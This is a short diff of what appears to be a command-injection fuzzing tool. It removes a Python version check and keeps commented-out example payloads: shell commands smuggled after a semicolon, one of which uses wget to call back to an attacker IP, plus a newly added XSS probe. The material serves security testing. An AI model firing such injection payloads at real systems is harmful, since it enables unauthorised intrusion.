@@ -251,16 +251,10 @@ except KeyboardInterrupt:
     ctx.log.error("Closing")
 
 
-#2)Ensure python 3 checks
-# https://stackoverflow.com/questions/6224736/how-to-write-python-code-that-is-able-to-properly-require-a-minimal-python-versi
-MIN_PYTHON = (3, 3)
-if sys.version_info < MIN_PYTHON:
-sys.exit("Python %s.%s or later is required.\n" % MIN_PYTHON)
-
-
-#3)Configuration examples that don't work with serialization feature we have with ping:
+#2)Configuration examples that don't work with serialization feature we have with ping:
 #payload = ";touch /tmp/ci_fuzz.txt"  #Don't forget to watch for new files in the victim's directory!! (ie: watch ls /tmp/ci_fuzz.txt)
 #payload = ";wget 10.10.10.10:80/ci_fuzz --no-proxy&"   #Don't forget to setup an http listener on attacker's IP!! (ie: python -m SimpleHTTPServer 80)
+#payload - "<script>alert('xss')</script>"   #tool not designed for this - not likely
 
 #END Unused/Development/TODO Functions.
 ###############################################
